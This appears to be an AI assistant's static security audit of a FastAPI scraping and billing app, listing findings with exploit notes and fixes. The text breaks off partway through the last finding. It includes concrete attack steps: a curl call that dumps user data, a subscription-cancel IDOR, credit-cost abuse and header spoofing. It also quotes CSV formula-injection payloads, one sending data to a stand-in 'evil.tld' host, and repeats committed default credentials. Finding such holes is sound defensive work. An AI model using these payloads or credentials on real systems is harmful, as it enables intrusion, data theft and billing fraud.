I've completed the review. I could not execute anything � every attempt to run `pytest`, `python -c`, or start the backend was blocked by the sandbox's permission mode � so **every finding below is from source inspection only, and nothing is marked "passing."** That constraint is detailed in the Gaps section.

---

# Deep Production Readiness Audit � <redacted GOOGLE_PAY_MERCHANT_NAME> Pro

**Repo:** `F:\webTest\scraper\business_scraper_api` @ `f60ec53` (main)
**Date:** 2026-11-16
**Method:** Static source review across backend, frontend, migrations, infra, CI. No code modified, no services touched, no `.env` or DB contents read.

---

## 1. Verdict

**Not production-ready.** There are three unauthenticated or near-unauthenticated paths to full account/data compromise (`/internal/debug_users`, the default-admin bootstrap with publicly documented credentials, and password reset tokens written to stdout), a privilege-escalation chain that lets a `support` user promote itself to `owner`, an IDOR that lets any user cancel any other customer's subscription, and a credit-cost formula that lets a user buy ~5 hours of scraping for 15 credits.

Separately, the system has a **structural delivery problem**: production traffic is proxied from Vercel to `server.progresslms.io`, and the committed server entry point (`backend/run_server.py:13`) hardcodes a path inside one developer's Windows user profile. The production API appears to be a developer workstation behind a Cloudflare tunnel.

---

## 2. Architecture Map

### 2.1 Runtime topology (as configured in the repo)

```
+----------------------------------------------------------------------+
� Flutter Web (Vercel)                                                 �
�  frontend/vercel.json                                                �
�   � /api/*  ?  REWRITE  https://server.progresslms.io/api/*          �
�   � /*      ?  /index.html  (SPA, usePathUrlStrategy)                �
�  JWT in SharedPreferences == browser localStorage                    �
+----------------------------------------------------------------------+
                �  Bearer JWT (HS256, 7-day, no revocation)
                ?
+----------------------------------------------------------------------+
� server.progresslms.io  ? Cloudflare Tunnel (docker-compose.yml       �
�                           `cloudflared` service) ? backend:8000      �
+----------------------------------------------------------------------+
                ?
+----------------------------------------------------------------------+
� FastAPI  backend/main.py  (6,144 lines, 128 routes, single module)   �
�  + AuditMiddleware   (request_id / client_ip / UA ? request.state)   �
�  + CORSMiddleware    (config.ALLOWED_ORIGINS + localhost regex)      �
�  + Auth deps: get_current_user ? get_admin_user(support+)            �
�  �                             ? get_admin_or_above(admin+)          �
�  �                             ? get_owner_user(owner)               �
�  + Scraper: GoogleBusinessScraper (Playwright/Chromium)              �
�  �   runs IN-PROCESS via BackgroundTasks � no queue, no worker       �
�  + Watchdog coroutine (2h stuck-job reaper)                          �
�  + Startup: init_database() ? migrations ? default-admin bootstrap   �
+----------------------------------------------------------------------+
                ?
+----------------------------------------------------------------------+
� Data layer � TWO independent, non-agreeing abstractions              �
�  database.py     get_db()  ? config.DATABASE_URL (read once @import) �
�                             sqlite3 | pooled PyMySQL (LifoQueue)     �
�  db/base.py      execute_query() ? os.getenv("DATABASE_URL")         �
�                             naive query.replace("?", "%s")           �
�  migrations/     000�013, paired *.sql / *_sqlite.sql                �
�                  runner: naive ';' line split, checksum NEVER checked�
+----------------------------------------------------------------------+

Side systems (declared, not deployed):
  � Celery + Redis  (background/celery_app.py, beat every 60s)
      ? no worker service in any Dockerfile/compose/railway.json
  � Stripe / PayPal / Google Pay  ? code present, feature-flagged OFF
      (ensure_default_admin_settings forces payment_methods=coinbase)

Competing deploy configs (all committed, mutually inconsistent):
  vercel.json (root)      ? api/index.py serverless, routes /api/* to it
  frontend/vercel.json    ? static SPA + proxy to server.progresslms.io
  frontend/netlify.toml   ? uses --web-renderer (removed in Flutter 3.29)
  frontend/firebase.json  � railway.json  � docker-compose.yml
  docker-compose.local.yml ? references frontend/Dockerfile.local
```

### 2.2 Critical flow � job creation and credit accounting

```
POST /api/jobs                                      main.py:3591
 + check_rate_limits(user)         conn#1   SELECT  ? TOCTOU
 + estimate_credit_cost(n, m)              main.py:204  ? NO input bounds
 + get_user_credit_balance()       conn#2   SELECT  ? TOCTOU
 + deduct_credits()                conn#3   SELECT+UPDATE (no lock)
 �   + record_credit_transaction() conn#4   INSERT
 + INSERT jobs                     conn#5
 + UPDATE credit_ledger ... ORDER BY ... LIMIT 1   ? not portable SQLite
 + increment_rate_limit()          conn#6
 + BackgroundTasks.add_task(run_scraping_job)  ? same process, launches Chromium

run_scraping_job                                    main.py:3193
 + per city:  progress = (idx+1)/len * 100   ? set BEFORE scraping (:3295)
              scrape_location(...)  asyncio.wait_for(180s)
              executemany INSERT results
 (no refund path exists anywhere � `grep -n refund main.py` ? 0 hits)
```

### 2.3 Critical flow � purchase

```
POST /api/payments/simple-purchase       main.py:4420
 + promo validate (read-only)  ?  create_payment_transaction(pending)
    ? Coinbase create_charge  ?  status='processing'  ?  hosted_url
                                     �
POST /api/webhooks/coinbase  --------+    main.py:4787
 + verify HMAC  ?                          coinbase_service.py:163
 + create_webhook_event(webhook_id UNIQUE) ? OUTSIDE try/except
 + finalize_transaction_completed()         payment_processor.py:510
     + guarded UPDATE status != 'completed'  (good)
     + _allocate_credits  (separate txn � crash window)
     + promo record_usage  (uses_count incremented only HERE)
     + invoice + celery send_invoice_email (no worker ? never sends)
```

---

## 3. Confirmed Findings

Severity: **C**ritical / **H**igh / **M**edium / **L**ow.

---

### C-1 � Unauthenticated endpoint dumps every user's PII
**`backend/main.py:1495-1523`**

```python
@app.get("/internal/debug_users")
async def _debug_list_users():          # ? no Depends(...) at all
    cursor.execute(
        "SELECT id, username, email, phone, is_approved, is_admin, "
        "created_at, last_login, approved_at, denied_at, denied_reason "
        "FROM users ORDER BY id DESC")
```

**Exploit:** `curl https://server.progresslms.io/internal/debug_users` � no token, no role. Returns the full user table including email, phone, admin flags, and last-login timestamps for every account. The path `/internal/*` is not blocked by `frontend/vercel.json` (which only rewrites `/api/*`), but the backend is directly reachable at the tunnel hostname regardless.

**Impact:** Complete customer-list disclosure (GDPR/CCPA-reportable). Also hands an attacker the admin usernames/emails needed to target C-2.

**Fix:** Delete the route. If a dev-only variant is genuinely needed, gate it behind `Depends(get_owner_user)` **and** `if not config.DEBUG: raise HTTPException(404)`.

---

### C-2 � Default admin bootstrap with credentials committed in 7 places
**`backend/database.py:416-477`** (defaults at **424-426**), called from `init_database()` at **`database.py:341`**, which runs on every startup (`main.py:345`).

```python
default_username = os.getenv("DEFAULT_ADMIN_USERNAME", "admin").strip()
default_email    = os.getenv("DEFAULT_ADMIN_EMAIL", "akb@tool.com").strip()
default_password = os.getenv("DEFAULT_ADMIN_PASSWORD", "tool.com")
```

The same credential pair appears in tracked files:

| File | Line |
|---|---|
| `backend/database.py` | 425�426 |
| `backend/.env.example` | 64�65 |
| `AGENTS.md` | 393 (`Default admin: admin / tool.com`) |
| `backend/scripts/check_job.py` | 4 |
| `backend/scripts/run_test_job.py` | 9 |
| `backend/scripts/test_login.py` | 9 |
| `backend/scripts/trigger_job.py` | 7 |
| `docker-compose.local.yml` | 12 |

**Exploit (two paths):**
1. Deploy without setting `DISABLE_DEFAULT_ADMIN` ? an admin account `admin` / `tool.com` is silently created on first boot. Anyone who reads the repo logs in as admin.
2. **Silent promotion** (`database.py:444-461`): if *no* admin row exists, the bootstrap looks up `WHERE username = 'admin' OR email = 'akb@tool.com'` and, on a match, runs `UPDATE users SET is_admin = 1, is_approved = 1`. So a self-registered ordinary user who picked the username `admin` is promoted to approved admin on the next restart � bypassing the approval queue entirely.

**Impact:** Full administrative takeover: grant unlimited credits, read every job's scraped results, delete users, mutate pricing.

**Fix:** Remove the hardcoded defaults � require `DEFAULT_ADMIN_PASSWORD` explicitly and refuse to bootstrap without it. Invert the flag to opt-in (`ENABLE_DEFAULT_ADMIN`, default off). Delete the promote-existing-user branch entirely. Purge the credential from the four `backend/scripts/*.py` files and `AGENTS.md`, and rotate the real password on any live database.

---

### C-3 � Password reset tokens printed to stdout; no reset email exists
**`backend/main.py:1407-1414`**

```python
# TODO: Send email with reset link
# For MVP, log the token to console
reset_url = f"http://localhost:8000/reset-password/{reset_token}"
print(f"\n{'='*60}")
print(f"PASSWORD RESET TOKEN FOR: {request.email}")
print(f"Reset URL: {reset_url}")
print(f"Token: {reset_token}")
```

**Evidence that this is not merely cosmetic:** `backend/notifications/email_service.py` defines `send_welcome_email`, `send_approval_email`, `send_rejection_email`, `send_admin_new_signup_email`, `send_invoice_email` � and **no password-reset function**. There is no caller anywhere for a reset email.

**Exploit:** Anyone with read access to container logs, the hosting platform's log drain, or a log-aggregation vendor can take over any account by email address. The token is the full secret (`secrets.token_urlsafe(32)`), valid 24 h (`main.py:1397`), consumed by an unauthenticated `POST /api/auth/reset-password` (`main.py:1449`).

**Secondary:** the URL points at `localhost:8000` � the *backend* port, not the frontend origin � so even if a user received it, it would not resolve. The Flutter route is `/reset-password/<token>` on the frontend (`frontend/lib/main.dart:102-108`).

**Impact:** Account takeover via log access. Password reset is also non-functional for real users.

**Fix:** Add `send_password_reset_email()` using the existing `send_email()` helper; build the link from `config.APP_URL` / `config.FRONTEND_URL`. Delete all four `print` statements. Reduce token lifetime to 1 h.

---

### C-4 � `support` role can self-promote to `owner`
**`backend/main.py:1573-1699`** (dependency at **1578**, role write at **1635-1656**), interacting with **`main.py:1086-1103`**.

```python
# 1086  get_admin_user � docstring says "read-only admin access"
if _user_role_level(current_user) < ROLE_HIERARCHY["support"] and not current_user.get("is_admin"):

# 1573-1578  �but it guards a full-mutation endpoint
@app.put("/api/admin/users/{user_id}")
async def update_user_profile(..., admin: dict = Depends(get_admin_user)):

# 1637  any VALID_ROLE accepted, including "owner"
if role not in VALID_ROLES: raise ...
```

**Exploit:** A `support` user calls `PUT /api/admin/users/<own_id>` with `{"role": "owner"}`. The last-admin guard at 1646-1651 only fires on *demotion*. There is no check that the actor outranks the target role. The support account becomes `owner`, unlocking `get_owner_user` endpoints: `/api/admin/audit/integrity`, `/api/admin/audit/archive`, `/api/admin/approvals/{id}/approve`.

**Compounding bug � `support` already bypasses the admin tier.** Line **1656** writes `is_admin = 1` for `support`:
```python
params.append(1 if role in ("admin", "owner", "support") else 0)
```
and `get_admin_or_above` (**1098**) short-circuits on `is_admin`:
```python
if _user_role_level(current_user) < ROLE_HIERARCHY["admin"] and not current_user.get("is_admin"):
```
`support` has level 1 (< 2) but `is_admin` is truthy, so the guard never raises. **The `admin` tier is unenforceable against `support` accounts.**

**Scope:** 62 of 68 role-guarded endpoints use `get_admin_user` � including `DELETE /api/admin/users/{id}`, `POST /api/admin/users/{id}/credits` (unlimited credit grants), `PUT /api/admin/settings/{key}` (toggle live payments), and all pricing/promo mutation.

**Fix:** (a) Stop setting `is_admin=1` for `support`; derive `is_admin` from `role in ("admin","owner")` only. (b) Delete the `or is_admin` fallback in `get_admin_or_above` and `get_admin_user`. (c) Move every mutating endpoint to `get_admin_or_above` or stricter. (d) In `update_user_profile`, reject any role change where `_user_role_level(admin) <= ROLE_HIERARCHY[new_role]`, and block self-role-change outright.

---

### H-1 � Credit formula goes negative: 15 credits buys hours of scraping
**`backend/main.py:204-208`** and request model **`main.py:606-609`**

```python
class ScrapingRequest(BaseModel):
    category: str
    cities_data: List[str]            # unbounded
    max_results_per_city: int = 10    # no ge=/le=

def estimate_credit_cost(num_cities, max_results_per_city) -> int:
    cost = cfg["base"] + (num_cities * cfg["per_city"]) \
         + (num_cities * max_results_per_city * cfg["per_result"])
    return max(cost, cfg["min_job"])   # min_job = 15
```

**Exploit:** `max_results_per_city = -10` makes the third term `-10n`, so `cost = 10 + 5n - 10n = 10 - 5n`, negative for `n = 3`, clamped to **15 credits regardless of city count**. Submit 1,000 `"a,b"` entries for 15 credits.

The loop at `main.py:3282-3413` still navigates Google Maps once per city (30 s page-load timeout at **3049**, 3� 1 s scroll at **3063-3065**, 180 s hard cap at **3336**). The watchdog (**3336**/**476-512**) only reaps at 2 h. Rate limits allow 2 concurrent + 5/hour per user (`config.py:96-97`). A new user's 100 starting credits buys 6 such jobs.

**Impact:** Billing bypass plus resource exhaustion. Because jobs run via `BackgroundTasks` **inside the uvicorn process** (`main.py:3665`) and each launches a Chromium (`main.py:2831`), a handful of concurrent abusive jobs will OOM the container.

**Fix:** `max_results_per_city: int = Field(10, ge=1, le=100)` and `cities_data: List[str] = Field(..., min_length=1, max_length=50)`. Clamp inside `estimate_credit_cost` as defence in depth. Move job execution to the already-declared Celery worker.

---

### H-2 � IDOR: any user can cancel/pause/resume any subscription
**`backend/main.py:4938-4960`** ? **`backend/subscriptions/subscription_manager.py:113-147`**

```python
@app.put("/api/subscriptions/{stripe_subscription_id}/cancel")
async def cancel_subscription(stripe_subscription_id: str, immediate: bool = False,
                              current_user: dict = Depends(get_current_user)):
    return _subscription_manager.cancel(stripe_subscription_id, at_period_end=not immediate)
    #                                   ? current_user is never used
```

`SubscriptionManager.cancel/pause/resume` call Stripe directly and then `UPDATE user_subscriptions ... WHERE stripe_subscription_id = ?` � no `user_id` predicate anywhere.

**Exploit:** Any authenticated user sends `PUT /api/subscriptions/sub_XXXX/cancel?immediate=true` with another customer's Stripe subscription ID. The subscription is deleted at Stripe. IDs leak via `GET /api/subscriptions/my-subscription` responses, support tickets, and Stripe emails.

**Impact:** Destructive cross-tenant action with direct revenue loss.

**Fix:** Look up the subscription by `(stripe_subscription_id, user_id=current_user["id"])` and 404 if absent, before any Stripe call. Apply to all three endpoints.

---

### H-3 � No refund on failed, cancelled, or empty jobs
**`backend/main.py:3619`** (charge) vs. **`main.py:3502-3583`** (failure handler) and **`main.py:3689-3757`** (cancel)

`grep -n "refund" backend/main.py` ? **0 matches**. Credits are deducted before the job starts; the failure path writes `status='failed'` and audit events but never credits the ledger back. `cancel_scraping_job` likewise returns nothing.

**Evidence of intent:** `migrations/001_payment_tables_sqlite.sql:17` defines `status ... CHECK(status IN (..., 'refunded'))` � a state no code can ever reach.

**Impact:** When Google rate-limits or blocks the scraper (the common failure mode � `scrape_location` returns `[]` on any exception, **main.py:3172-3174**), the user pays full price for zero results. For a paid product this is a direct chargeback and churn driver.

**Fix:** In the `except` block of `run_scraping_job`, in `cancel_scraping_job`, and on completion-with-zero-results, compute `charged - earned` and call `add_credits(user_id, refund, reason="Job failed refund", ...)` guarded by a `credit_ledger` lookup so it is idempotent.

---

### H-4 � Webhook retries are structurally impossible
**`backend/payments/webhook_handler.py:28-34`** + **`backend/db/payment_crud.py:383-405`** + **`backend/migrations/001_payment_tables.sql:83`**

```sql
webhook_id VARCHAR(255) UNIQUE NOT NULL,
```
```python
webhook_db_id = create_webhook_event(webhook_id=webhook_id, ...)   # ? OUTSIDE try:
try:
    ...
except Exception as e:
    mark_webhook_failed(webhook_db_id, str(e))
    raise
```

**Failure scenario:** Coinbase delivers `charge:confirmed`; processing throws (transient DB blip); `mark_webhook_failed` records it; the handler re-raises ? `main.py:4798` converts to **HTTP 400**. Coinbase retries the same `event.id`. The `INSERT` now violates the UNIQUE constraint, raising **before** the `try` � so it 400s again, forever. The transaction stays `processing` and the customer never receives credits for money already paid.

The declared safety net (`background/tasks.py:27` `reconcile_processing_transactions`, scheduled every 60 s in `background/celery_app.py:16-21`) **has no worker deployed** � no Celery service exists in `backend/Dockerfile`, `docker-compose.yml`, `docker-compose.local.yml`, or `railway.json`.

**Impact:** Paid-but-uncredited transactions with no automated recovery; provider eventually disables the endpoint.

**Fix:** Make ingestion idempotent � `SELECT id, status FROM webhook_events WHERE webhook_id = ?` first; if `processed`, return `{"received": True}` immediately; if `pending`/`failed`, reuse the row. Wrap the insert in its own try. Return **200** on handler errors after recording, so retries stay possible but don't trigger endpoint disabling. Deploy a Celery worker + beat, or replace the reconciler with an in-process `asyncio` task alongside the existing watchdog.

---

### H-5 � No password policy anywhere
**`backend/main.py:572-578`** (`UserRegister.password: str`), **`main.py:586-588`** (`ResetPasswordRequest.new_password: str`)

`grep -n "len(.*password\|min_length" backend/main.py` ? only `backend/scripts/reset_admin_password.py:43` (a CLI script) enforces anything.

**Exploit:** `POST /api/auth/register` with `{"password": "a"}` succeeds. Combined with the login lockout being IP-bypassable (**H-6**), weak passwords are trivially brute-forced.

**Fix:** `password: str = Field(..., min_length=12, max_length=128)` on both models; add a breached-password check or at minimum reject the top-N common list. Also cap length � bcrypt silently truncates at 72 bytes.

---

### H-6 � Login rate limit bypassable via `X-Forwarded-For`
**`backend/main.py:771-777`** and **`backend/audit/middleware.py:22-29`**

```python
def _get_client_ip(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()   # first = client-supplied, unvalidated
```

This value is the `identifier` for the `scope="ip"` lockout (`main.py:1277`, `_record_login_failure` at **893**).

**Exploit:** Send each login attempt with a fresh `X-Forwarded-For: <random IP>`. Each creates a new `login_rate_limits` row with `attempts=1`. The IP lockout never fires. The username-scoped limit (8 attempts / 10 min, `main.py:766-768`) still applies per account, but password-spraying across many usernames is unrestricted � and every forged header also writes a junk row, making `login_rate_limits` an unbounded attacker-controlled table.

**Note:** the traffic path is Vercel ? Cloudflare Tunnel ? backend, so there is a real proxy chain. The fix is not to drop XFF but to parse it correctly.

**Fix:** Configure `uvicorn --proxy-headers --forwarded-allow-ips=<tunnel IP>` and read `request.client.host`; or take the **last** XFF entry after trimming a configured number of trusted hops; or prefer Cloudflare's `CF-Connecting-IP`. Add a global unauthenticated-request rate limit (e.g. `slowapi`) in front of `/api/auth/*`.

---

### H-7 � Email templates are gitignored; a clean clone cannot send any email
**`.gitignore:92`** (`*.html`) vs **`backend/notifications/email_service.py:19-24, 71-72, 103-104, 136-137, 171-172, 203-204`**

The templates exist on disk:
```
backend/notifications/templates/{welcome,approval,rejection,invoice,payment_confirmation,admin_new_signup}_email.html
```
but `git ls-files` (full 371-file listing) contains only `backend/notifications/__init__.py` and `backend/notifications/email_service.py` under that package. `.gitignore` line 92 is a blanket `*.html`; the only tracked HTML is `frontend/web/index.html`, which was force-added.

**Failure scenario:** `git clone` ? `docker build -f backend/Dockerfile .` ? `COPY backend/ .` (**Dockerfile:42**) copies no templates. `_render_template` raises `FileNotFoundError`. In `register` it is swallowed (`main.py:1260`). In `approve_user` it runs inside `background_tasks.add_task`, so it fires *after* the 200 response � the admin sees success, the user never gets the approval email and never knows the account is live.

**Fix:** Replace `*.html` in `.gitignore` with a scoped ignore, `git add -f backend/notifications/templates/`, and add a startup assertion that every referenced template exists.

---

### H-8 � Migration runner silently accepts partial failure and never validates checksums
**`backend/db/migration_runner.py:284-287, 300-323, 189-214`**

```python
except Exception as e:                       # 284
    logger.error(f"? Failed to apply migration {version}: {str(e)}")
    conn.rollback()
    return False                             # ? swallowed

# 312-318
success = apply_migration(...)
if success: applied_count += 1
else:
    logger.error(f"Migration {version} failed. Stopping migration process.")
    break                                    # ? no raise
```

`init_database()` (`database.py:330-331`) then logs *"? Database initialized successfully"* and the app serves traffic on a half-migrated schema.

**Worse on MySQL:** DDL is non-transactional. `conn.rollback()` cannot undo a `CREATE TABLE`/`ALTER TABLE`, and the `INSERT INTO schema_migrations` never runs. On the next boot the same migration re-runs and fails on *"table already exists"* / *"duplicate column"* � **permanently wedged**, with no rollback support (`rollback_migration` at **386-395** is a stub that logs *"not yet implemented"*).

`validate_migration_checksum` (**189-214**) is defined and never called by `apply_migration` or `run_pending_migrations` � migration drift is undetectable despite the docstring at **line 6** claiming *"Checksum validation to detect modified migrations."*

**Secondary:** the statement splitter (**248-260**) splits on any line ending in `;`, ignoring string literals and block bodies. `009_paypal_provider_sqlite.sql` already contains explicit `BEGIN TRANSACTION;` / `COMMIT;` that the runner executes as standalone statements, interleaved with its own `conn.commit()`.

**Fix:** Re-raise on migration failure so startup aborts. Call `validate_migration_checksum` for every already-applied migration and refuse to start on mismatch. Make each MySQL migration individually idempotent (`CREATE TABLE IF NOT EXISTS`, guarded `ALTER`). Replace the hand-rolled splitter with `sqlparse.split()`.

---

### H-9 � SQLite-only SQL on the purchase path breaks every MySQL deployment
**`backend/payments/pricing_engine.py:53-67`**

```python
SELECT COALESCE(SUM(credits_purchased), 0)
FROM payment_transactions
WHERE user_id = ? AND status = 'completed'
  AND datetime(created_at) >= datetime('now', '-30 days')
```

MySQL has no `datetime(expr, modifier)` function ? `ER_SP_DOES_NOT_EXIST (1305)`.

**Evidence the codebase knows better:** `backend/analytics/revenue_analytics.py:24-53` branches explicitly on `_db_type()` and uses plain comparisons for MySQL. `pricing_engine` does not.

**Call chain:** `get_user_pricing_tier` ? `calculate_for_package` ? `POST /api/payments/calculate-price` (**main.py:4278**), `POST /api/payments/purchase` (**4302**), `POST /api/promos/validate` (**4963**), `initiate_coinbase_package_purchase` (**payment_processor.py:248**). `calculate_price` catches only `ValueError` (**main.py:4298**), so a PyMySQL error surfaces as an unhandled 500.

`backend/.env.example:14` sets `DB_TYPE=mysql` as the documented production configuration.

**Related, same class:**
- `backend/analytics/event_queries.py:269` � `CAST(user_id AS TEXT)`. MySQL has no `TEXT` cast target ? `ER_PARSE_ERROR (1064)`. Breaks `GET /api/admin/analytics/funnel`.
- `backend/main.py:382` � startup fallback runs `CREATE TABLE ... INTEGER PRIMARY KEY AUTOINCREMENT` (SQLite spelling; MySQL is `AUTO_INCREMENT`). Wrapped in try/except at **404**, so it degrades to a warning, but the fallback is dead code on MySQL.

**Fix:** Branch on `get_db_type()` as `revenue_analytics.py` does, or compute the cutoff in Python and bind it as a parameter (preferred � portable and index-friendly). Add a CI job that runs the suite against MySQL 8.

---

### H-10 � Production API depends on a developer's Windows workstation
**`backend/run_server.py:13`**

```python
os.environ['PLAYWRIGHT_BROWSERS_PATH'] = r'C:\Users\Computer Max\AppData\Local\ms-playwright'
```

`README.md:58-61` names `run_server.py` the recommended entry point. `frontend/vercel.json:7` rewrites production `/api/*` to `https://server.progresslms.io`. `docker-compose.yml:37-44` runs a `cloudflared` tunnel pointed at `backend`. Commit `dd5066e` is titled *"migrate frontend and tunnel to use Cloudflare proxy to local backend."*

**Impact:** No horizontal scaling, no uptime guarantee, no managed backups, laptop sleep = outage, and the host filesystem (including `backend/.env`) sits one RCE away from the public internet.

**Fix:** Deploy the backend to Railway/Fly/Render using `backend/Dockerfile` (which already installs Chromium correctly). Point `frontend/vercel.json` at that host. Reduce `run_server.py` to a dev-only helper with the hardcoded path removed.

---

### M-1 � Credit balance race: concurrent jobs double-spend
**`backend/main.py:235-247`** (`deduct_credits`), **`250-262`** (`add_credits`), **`3602-3619`** (caller)

```python
def deduct_credits(user_id, amount, ...):
    conn = get_db()
    cursor.execute("SELECT credit_balance FROM users WHERE id = ?", (user_id,))
    current = cursor.fetchone()[0] or 0          # ? read
    new_balance = max(0, current - amount)        # ? compute in Python
    cursor.execute("UPDATE users SET credit_balance = ? ...", (new_balance, ...))
```

No `SELECT ... FOR UPDATE`, no `UPDATE ... SET balance = balance - ? WHERE balance >= ?`. `create_scraping_job` additionally reads the balance on a *different* connection (`main.py:3609`) before deducting on a third.

**Failure scenario:** Balance 100, cost 60. Two simultaneous `POST /api/jobs`. Both read 100, both pass the sufficiency check, both write 40. Two jobs run, 60 credits charged instead of 120. `max(0, ...)` also silently masks overdraft rather than failing, and the ledger `balance_after` values become inconsistent.

The same pattern applies to `check_rate_limits` (**265**) vs `increment_rate_limit` (**325**) � the 2-concurrent-job cap is bypassable by racing.

**Fix:** Single conditional statement � `UPDATE users SET credit_balance = credit_balance - ? WHERE id = ? AND credit_balance >= ?`; treat `rowcount == 0` as insufficient funds. Perform the balance check, deduction, job insert, and ledger insert on **one** connection inside **one** transaction.

---

### M-2 � Promo `max_uses` / `max_uses_per_user` enforceable only after payment
**`backend/promotions/promo_service.py:101-106`** (check) vs **`128-151`** (`record_usage`), called from **`payment_processor.py:589`**

`uses_count` is incremented only inside `finalize_transaction_completed` � i.e. after the webhook arrives. Between checkout creation and webhook, validation reads a stale count.

**Exploit:** Open N checkout sessions concurrently with a `max_uses: 1` code. All N validate, all N receive the discounted Coinbase charge, all N finalize.

**Compounding � the Coinbase path skips amount bounds.** `initiate_stripe_package_purchase` (**payment_processor.py:160-163**) and `initiate_paypal_package_purchase` (**363-366**) both enforce `min_purchase_cents` / `max_purchase_cents`. `initiate_coinbase_package_purchase` (**222-327**) does not. Neither does `simple_purchase` (`main.py:4420-4461`), where a 100 %-off promo yields `total_cents = 0` ? `create_charge(amount="0.00")`. `SimplePurchaseRequest.credits` (**main.py:4416**) has a lower bound of 100 but no upper bound.

**Fix:** Reserve the use atomically at checkout creation � `UPDATE promo_codes SET uses_count = uses_count + 1 WHERE id = ? AND (max_uses IS NULL OR uses_count < max_uses)` and abort on `rowcount == 0`; insert the `promo_code_usage` row in the same transaction; release on failure/expiry. Add the min/max guard to both Coinbase paths and reject `total_cents <= 0`.

---

### M-3 � Test suite can read and write the developer's real database
**`backend/tests/conftest.py:39-48`** vs **`backend/config.py:10, 20`** and **`backend/database.py:485`**

```python
# conftest.py
monkeypatch.setenv("DATABASE_URL", db_url)    # tmp sqlite file
monkeypatch.setenv("DB_TYPE", "sqlite")
from database import init_database, get_db
init_database()
```
```python
# config.py  � evaluated ONCE at first import, after load_dotenv(backend/.env)
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///scraper.db")

# database.py:485 � get_db reads the cached module attribute, not the env var
conn = sqlite3.connect(config.DATABASE_URL.split("///")[1])
```

`monkeypatch.setenv` cannot retroactively change `config.DATABASE_URL`. Whichever test imports `config` (directly, or transitively via `from main import app` in `test_auth_approval.py:63`, or `db.base` ? `database` ? `config`) pins it for the whole session.

**Two concrete outcomes:**
1. Developer's `backend/.env` sets `DATABASE_URL=sqlite:///scraper.db` ? **the suite initialises and writes to the real `scraper.db`.** `test_admin_suspend_restore_and_delete_workflow` (`test_auth_approval.py:155-234`) creates users and issues `DELETE FROM users`.
2. Developer's `.env` sets `DATABASE_URL=mysql://...` ? `DB_TYPE=sqlite` routes to the SQLite branch, and `"mysql://u:p@h/db".split("///")` returns a 1-element list ? **`IndexError: list index out of range`** on every test.

`db/base.get_db_type()` (**db/base.py:34-49**) reads `os.getenv` directly while `database._get_db_type()` (**database.py:29-33**) reads `config.DATABASE_URL` � the two abstractions can disagree, which is exactly how outcome 2 arises.

**Fix:** Make the DB target resolve lazily � replace `config.DATABASE_URL` with `def database_url(): return os.getenv("DATABASE_URL", ...)`, or have `conftest` `importlib.reload(config)` after `monkeypatch.setenv`. Parse the URL with `urlparse` instead of `.split("///")`. Add a `conftest` guard that refuses to run if the resolved path is not under `tmp_path`.

---

### M-4 � `docker-compose.yml` cannot connect to its own MySQL
**`docker-compose.yml:10-21`**

```yaml
environment:
  - DB_TYPE=mysql
  - MYSQL_HOST=mysql
  - MYSQL_USER=scraper
  - MYSQL_PASSWORD=scraper_pass
  - MYSQL_DB=scraper_db
```

`grep -rn "MYSQL_HOST\|MYSQL_USER\|MYSQL_DB" backend/` ? **0 matches**. `_create_mysql_connection` (`database.py:181-207`) parses only `config.DATABASE_URL`, which is unset here and defaults to `sqlite:///scraper.db`. `urlparse` yields `hostname=None`, `username=''`, `password=''`, `db='scraper.db'` � PyMySQL then dials `localhost:3306` *inside the backend container*. Connection refused on every request.

**Also in this file:**
- **L:15-16, 28-31** � credentials `scraper`/`scraper_pass` and root `root_pw` committed in plaintext.
- **L:32-33** � `ports: "3306:3306"` binds MySQL to **all host interfaces**. (`docker-compose.local.yml` correctly uses `127.0.0.1:8001:8000`.)
- **L:19, 22** � `./backend:/app` bind mount plus `--reload`: a dev configuration in the primary compose file, which also mounts `backend/.env` into the container.

**Fix:** Replace the five `MYSQL_*` vars with `DATABASE_URL=mysql+pymysql://scraper:${MYSQL_PASSWORD}@mysql:3306/scraper_db`. Move credentials to `.env` with `${VAR:?}` required-substitution (as `docker-compose.local.yml:9-11` already does correctly). Change the port mapping to `127.0.0.1:3306:3306` or drop it. Split dev overrides into `docker-compose.override.yml`.

---

### M-5 � Tracked SQLite database file
**`scraper.db`** (repo root) � present in `git ls-files`; currently 0 bytes in the working tree.

`.gitignore` ignores `*.log` and `.env` but **not** `*.db`; `.dockerignore:4` does exclude `**/*.db`, so the Docker image is unaffected.

**Risk:** The file is tracked, so any commit in which it was non-empty permanently embeds production/dev rows � password hashes, emails, phone numbers, scraped lead data � in git history, including on `origin/main`. I could not inspect historical blob sizes (`git log -- <path>` and `git cat-file` were blocked), so **the contents of past revisions are unverified.**

**Fix:** `git rm --cached scraper.db`, add `*.db` / `*.db-wal` / `*.db-shm` to `.gitignore`, then audit history (`git log --all --oneline -- scraper.db` and `git cat-file -s`). If any revision held real data, purge with `git-filter-repo` and rotate every credential it contained.

---

### M-6 � Audit hash chain forks under multiple workers
**`backend/audit/service.py:18, 38-53, 119`**

```python
_last_record_hash: Optional[str] = None          # module-level, per-process
def _get_last_hash():
    if _last_record_hash is not None:
        return _last_record_hash                 # never re-reads the DB
```

Each uvicorn/gunicorn worker caches its own tip. With `--workers N`, worker A writes `prev_hash = H_a` while worker B writes `prev_hash = H_b` � both claiming the same predecessor. `GET /api/admin/audit/integrity` (`main.py:5783` ? `audit/retention.verify_hash_chain`) will report tampering on a perfectly honest log, destroying the control's value.

Also: `record_audit_event` catches every exception and returns `None` (**121-123**) � audit writes can fail silently during a security incident.

**Fix:** Read the tip inside the same transaction as the insert (`SELECT record_hash FROM audit_events ORDER BY id DESC LIMIT 1 FOR UPDATE`), or make the chain per-worker with an explicit `worker_id` column. Emit a `logger.critical` metric when an audit write fails.

---

### M-7 � CSV formula injection in the admin activity export
**`backend/main.py:5533-5556`** fed by **`main.py:1300-1309`**

```python
# 1300-1306 � unauthenticated input lands in the audit log verbatim
record_audit_event("auth.login", actor_username=credentials.username,
                   status="failure", failure_reason="Invalid credentials", ...)

# 5549-5551 � exported with no escaping
writer = csv.DictWriter(output, fieldnames=rows[0].keys())
writer.writerows(rows)
```

**Exploit:** An unauthenticated attacker posts to `/api/auth/login` with `username` = `=HYPERLINK("https://evil.tld?d="&A1,"Click")` (or `=cmd|'/c calc'!A1`). The failed-login audit row stores it. An admin later downloads `/api/admin/activity/export` and opens `activity_log.csv` in Excel ? formula executes in the admin's desktop context.

